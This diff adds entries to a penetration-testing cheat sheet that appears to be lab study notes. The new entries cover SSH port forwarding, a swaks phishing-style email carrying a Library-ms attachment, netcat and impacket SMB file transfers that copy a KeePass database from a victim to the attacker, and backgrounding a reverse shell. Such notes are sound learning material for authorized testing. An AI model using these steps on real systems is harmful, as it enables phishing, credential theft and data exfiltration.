@@ -364,9 +364,6 @@ When looking at the output from ifconfig, ipconfig, or ip addr, see if there is 
        valid_lft forever preferred_lft forever
 ```
 
-#### What to do with SMB
-
-If you have access to SMB shares, your options are to enumerate the shares for valuable information, and to craft 
 
 #### When you See Input Section on Website
 
@@ -400,3 +397,144 @@ Try to set up a quick python server and make a get request with HTML:
 #### Probably the best Cheat Sheet I've Found
 
 "https://cheatsheet.haax.fr/web-pentest/injections/server-side-injections/sql/" 
+
+#### Alternatives for id_rsa
+
+".ssh/id_dsa, .ssh/id_ecdsa, .ssh/id_ed25519, .ssh/authorized_keys"
+
+#### Acessing Loopback Interface
+
+Found webserver running on port 8000 on the remote machine's loopback interface. Do the following to be able to access the port on your own loopback:
+
+```bash
+ssh -N -L 9000:localhost:8000 -i 245/id_ecdsa anita@192.168.196.246 -p 2222
+```
+
+
+#### Swaks
+
+This didn't work without the '@' in front of the attachment.
+
+```bash
+sudo swaks -t jim@relia.com --from maildmz@relia.com --attach @config.Library-ms --server 192.168.196.189 --body body.txt --header "Subject: Staging Script" -ap
+ ```
+
+#### Transfer Files with NetCat
+
+On your computer:
+
+```bash
+nc -l -p 12345 > received_file
+```
+
+On the remote computer, Windows in this case:
+
+```bash
+Get-Content .\yourfile.txt -Raw | nc.exe <Your_IP_Address> 12345
+```
+
+#### Create Samba (SMB) Share on Kali
+
+To start an SMB share on a Kali Linux machine, you typically use Samba, a popular open-source        
+software suite that provides file and print services to SMB/CIFS clients. Here's a quick guide:      
+
+1. Install Samba:
+
+```bash   
+sudo apt update                            sudo apt install samba
+```
+
+2. Configure Samba:
+    • Edit the Samba configuration file:
+       sudo nano /etc/samba/smb.conf
+
+    • Add your share definition at the end of the file. For example:        
+
+```bash
+       [MyShare]
+       path = /path/to/your/share
+       available = yes
+       valid users = your_username
+       read only = no
+       browsable = yes              
+       public = yes
+       writable = yes
+```
+
+   3 Add a Samba User:
+    • Samba requires a Linux user to map to. If you haven't already, create a Linux user or use an   
+      existing one.
+    • Then, add the user to Samba:
+
+```bash
+sudo smbpasswd -a your_username
+sudo systemctl restart smbd nmbd
+```
+
+4.  Verify the Share:
+     • From a Windows machine, you can access the share using "\\kali_ip\MyShare".
+    • From a Linux machine, use smbclient
+    "//kali_ip/MyShare -U your_username" to access the share.
+
+Alternative:
+
+Kali:
+
+```bash
+impacket-smbserver -smb2support newShare . -username test -password test
+```
+
+Windows:
+
+```bash
+PS C:\Users\jim\Documents> net use z: \\Kali_IP\newShare /u:test test
+PS C:\Users\jim\Documents> copy Database.kdbx z:\
+```
+
+#### Host an Apache Web Server
+
+```bash
+sudo systemctl start apache2
+cp file.txt /var/www/html/
+# You can access the files on port 80 of your machine/ip
+```
+
+#### Borg
+
+```bash
+sudo borg list /opt/borgbackup/
+sudo borg extract /opt/borgbackup/::home --stdout
+```
+
+#### Verify Checksum
+
+Download the software, then echo the copied checksum along with the filename of the installer into a file, then use the sha256sum -c command:
+
+```bash
+kali@kali:~$ cd ~/Downloads
+
+kali@kali:~/Downloads$ echo "4987776fef98bb2a72515abc0529e90572778b1d7aeeb1939179ff1f4de1440d Nessus-10.5.0-debian10_amd64.deb" > sha256sum_nessus
+
+kali@kali:~/Downloads$ sha256sum -c sha256sum_nessus
+Nessus-10.5.0-debian10_amd64.deb: OK
+```
+
+#### Background a Payload, Shell, or Process
+
+Let's say that you're executing a reverse shell (from a reverse shell), and you don't want that shell to just hang there, simply append an '&' to the end of your command and it will background the reverse shell process:
+
+```bash
+./binary444&
+```
+
+#### Check What Process is Running on a Port
+
+```bash
+Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
+```
+
+```bash
+sudo ss -ltnp | grep ':8080'
+# or
+sudo netstat -ltnp | grep ':8080'
+```
